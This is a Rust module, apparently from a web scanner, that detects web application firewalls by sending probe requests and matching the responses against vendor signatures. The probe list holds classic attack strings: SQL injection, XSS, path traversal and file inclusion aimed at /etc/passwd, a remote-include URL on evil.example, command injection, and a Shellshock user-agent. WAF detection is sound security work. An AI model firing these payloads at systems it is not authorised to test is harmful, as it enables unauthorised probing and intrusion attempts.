use super::ScanContext;
use crate::core::WorkerPool;
use regex::Regex;
use serde_json::{json, Value};
use std::sync::OnceLock;
use std::time::Duration;

struct WafRule {
    waf: &'static str,
    re: Regex,
}

fn waf_rules() -> &'static Vec<WafRule> {
    static RULES: OnceLock<Vec<WafRule>> = OnceLock::new();
    RULES.get_or_init(|| {
        const SIGNATURES: &[(&str, &str)] = &[
            ("cloudflare", "cloudflare"),
            ("cloudflare", "__cf_bm"),
            ("cloudflare", "cf-ray"),
            ("akamai", "akamai"),
            ("akamai", "akamaized"),
            ("imperva", "imperva"),
            ("incapsula", "incapsula"),
            ("incapsula", "x-iinfo"),
            ("modsecurity", "mod_security"),
            ("modsecurity", "modsecurity"),
            ("f5", "bigip"),
            ("f5", "ts[0-9]{4}"),
            ("barracuda", "barracuda"),
            ("sucuri", "sucuri"),
            ("sucuri", "x-sucuri"),
            ("wordfence", "wordfence"),
            ("aws_waf", "awswaf"),
            ("aws_shield", "x-amzn-trace"),
            ("aws_shield", "x-amz-cf-id"),
            ("nginx_ngx_waf", "ngx_waf"),
            ("comodo", "comodo"),
            ("siteground", "siteground"),
            ("stackpath", "stackpath"),
            ("fastly", "fastly"),
            ("citrix_netscaler", "ns_aa"),
            ("citrix_netscaler", "netscaler"),
            ("distil", "distil"),
            ("sophos", "sophos"),
            ("fortinet", "fortinet"),
            ("radware", "radware"),
            ("keycdn", "keycdn"),
            ("bitninja", "bitninja"),
            ("block_script", "blocked because of"),
            ("block_script", "has been blocked"),
            ("block_script", "request blocked"),
            ("captcha", "captcha"),
            ("captcha", "challenge"),
        ];
        SIGNATURES
            .iter()
            .map(|(waf, sig)| WafRule {
                waf,
                re: Regex::new(sig).unwrap(),
            })
            .collect()
    })
}

struct ProbeResult {
    detection: Value,
    waf: Option<String>,
}

/// WAF detection: send known attack payloads (in parallel) and analyze
/// responses for WAF signatures (headers, cookies, status codes, challenge
/// pages).
pub async fn run(ctx: &ScanContext) {
    let started = std::time::Instant::now();
    let base = match ctx.base_url() {
        Some(b) => b,
        None => {
            ctx.emitter.event("error", "invalid target URL").await;
            return;
        }
    };
    let timeout = Duration::from_secs(ctx.timeout().max(1));

    let probes = vec![
        ("sqli", "GET", "/?id=1' OR '1'='1'--"),
        ("xss", "GET", "/?q=<script>alert(1)</script>"),
        ("sqli_union", "GET", "/?id=1 UNION SELECT password FROM users--"),
        ("path_traversal", "GET", "/../../../../etc/passwd"),
        ("lfi", "GET", "/?file=../../../../etc/passwd"),
        ("rfi", "GET", "/?url=http://evil.example/x.php"),
        ("cmdi", "GET", "/?cmd=;cat%20/etc/passwd"),
        ("nosql", "GET", "/?user[$ne]=x&pass[$ne]=y"),
        ("bad_ua", "GET", "/"),
        ("oversize", "GET", "/"),
    ];

    let pool = WorkerPool::new(ctx.job.concurrency.max(1));
    let client = ctx.client.clone();
    let deadline = ctx.deadline;
    let target = base.to_string();

    let results: Vec<ProbeResult> = pool
        .run(probes, move |(name, method, path)| {
            let client = client.clone();
            let base = base.clone();
            async move {
                if deadline.is_some_and(|d| std::time::Instant::now() >= d) {
                    return ProbeResult {
                        detection: json!({ "probe": name, "path": path, "status": 0, "skipped": true }),
                        waf: None,
                    };
                }
                let mut url = base.clone();
                if let Some(query) = path.split_once('?') {
                    url.set_path(query.0);
                    url.set_query(Some(query.1));
                }
                let mut req = client.request(
                    if method == "POST" { reqwest::Method::POST } else { reqwest::Method::GET },
                    url.clone(),
                );
                if name == "bad_ua" {
                    req = req.header("user-agent", "() { :; }; echo vulnerable");
                }
                if name == "oversize" {
                    req = req.header("x-test", "A".repeat(4096));
                }

                let resp = match tokio::time::timeout(timeout, req.send()).await {
                    Ok(Ok(r)) => r,
                    _ => {
                        return ProbeResult {
                            detection: json!({ "probe": name, "path": path, "status": 0, "error": "timeout/error" }),
                            waf: None,
                        };
                    }
                };
                let status = resp.status().as_u16();
                let headers_joined: Vec<(String, String)> = resp
                    .headers()
                    .iter()
                    .map(|(k, v)| (k.as_str().to_string(), v.to_str().unwrap_or_default().to_string()))
                    .collect();
                let body = match resp.text().await {
                    Ok(b) => b,
                    Err(_) => String::new(),
                };
                let body_lower = body.to_lowercase();
                let header_text = headers_joined
                    .iter()
                    .map(|(k, v)| format!("{k}: {v}"))
                    .collect::<Vec<_>>()
                    .join("\n")
                    .to_lowercase();

                let mut hit: Option<String> = None;
                for rule in waf_rules() {
                    if rule.re.is_match(&header_text) || rule.re.is_match(&body_lower) {
                        hit = Some(rule.waf.to_string());
                        break;
                    }
                }

                let blocked = status == 403
                    || status == 406
                    || status == 429
                    || status == 444
                    || status == 418
                    || body_lower.contains("captcha")
                    || body_lower.contains("challenge")
                    || body_lower.contains("blocked")
                    || body_lower.contains("attention required")
                    || body_lower.contains("access denied")
                    || body_lower.contains("forbidden by")
                    || body_lower.contains("error code 1020")
                    || body_lower.contains("sorry, you have been blocked");

                ProbeResult {
                    detection: json!({
                        "probe": name,
                        "path": path,
                        "status": status,
                        "blocked": blocked,
                        "waf_signature": hit,
                        "body_snippet": body.chars().take(150).collect::<String>(),
                    }),
                    waf: hit,
                }
            }
        })
        .await;

    let mut detections: Vec<Value> = Vec::with_capacity(results.len());
    let mut signatures_hit: Vec<String> = Vec::new();
    for r in results {
        if let Some(waf) = &r.waf {
            if !signatures_hit.contains(waf) {
                signatures_hit.push(waf.clone());
            }
        }
        detections.push(r.detection);
    }

    let mut waf_list: Vec<Value> = Vec::new();
    for waf in &signatures_hit {
        waf_list.push(json!({
            "name": waf,
            "confidence": "medium",
            "evidence": "signature matched in headers or body",
        }));
    }

    // If many probes are blocked but no signature matched, report generic WAF.
    let blocked_count = detections.iter().filter(|d| d["blocked"] == json!(true)).count();
    if waf_list.is_empty() && blocked_count >= 3 {
        waf_list.push(json!({
            "name": "unknown-waf",
            "confidence": "low",
            "evidence": format!("{blocked_count}/{} probes were blocked", detections.len()),
        }));
    }

    ctx.emitter
        .result(json!({
            "target": target,
            "probes_sent": detections.len(),
            "blocked_probes": blocked_count,
            "detected_wafs": waf_list,
            "probe_details": detections,
        }))
        .await;
    ctx.emitter.complete(started.elapsed().as_millis()).await;
}
